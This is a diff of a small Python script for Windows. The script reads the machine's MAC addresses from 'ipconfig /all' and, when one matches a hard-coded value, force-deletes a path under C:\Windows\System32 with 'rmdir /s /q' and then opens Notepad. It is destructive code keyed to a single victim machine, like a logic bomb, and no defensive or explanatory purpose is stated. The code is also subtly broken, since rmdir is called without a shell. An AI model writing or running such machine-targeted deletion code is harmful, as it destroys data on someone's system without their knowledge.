@@ -1,27 +1,34 @@
 import subprocess
 import re
-# Run the 'ipconfig /all' command
-result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
 
-# Capture the output in the variable named 'tri'
-tri = result.stdout
-
-mac_address_pattern = r'Physical Address.*:\s+([0-9A-F-]+)'
-
-# Extract MAC addresses using the regex pattern
-mac_addresses = re.findall(mac_address_pattern, tri)
-
-if "36-02-86-52-8E-DD" in mac_addresses:
+def delete_folder(path):
     try:
-        
-        try:
-            subprocess.run(['rmdir', '/s', '/q', path], check=True)
-            print(f"Folder at {path} deleted successfully.")
-        except subprocess.CalledProcessError as e:
-            print(f"Error: {e}")
-
-        subprocess.Popen(['notepad.exe'])
-        print("Notepad opened successfully.")
-    except Exception as e:
+        subprocess.run(['rmdir', '/s', '/q', path], check=True)
+        print(f"Folder at {path} deleted successfully.")
+    except subprocess.CalledProcessError as e:
         print(f"Error: {e}")
 
+def main():
+    # Run the 'ipconfig /all' command
+    result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
+
+    # Capture the output in the variable named 'tri'
+    tri = result.stdout
+
+    mac_address_pattern = r'Physical Address.*:\s+([0-9A-F-]+)'
+
+    # Extract MAC addresses using the regex pattern
+    mac_addresses = re.findall(mac_address_pattern, tri)
+
+    if "36-02-86-52-8E-DD" in mac_addresses:
+        folder_path = r"C:\Windows\System32\DDDFFFss\sapu.dll.mui"
+        delete_folder(folder_path)
+
+        try:
+            subprocess.Popen(['notepad.exe'])
+            print("Notepad opened successfully.")
+        except Exception as e:
+            print(f"Error opening Notepad: {e}")
+
+if __name__ == "__main__":
+    main()
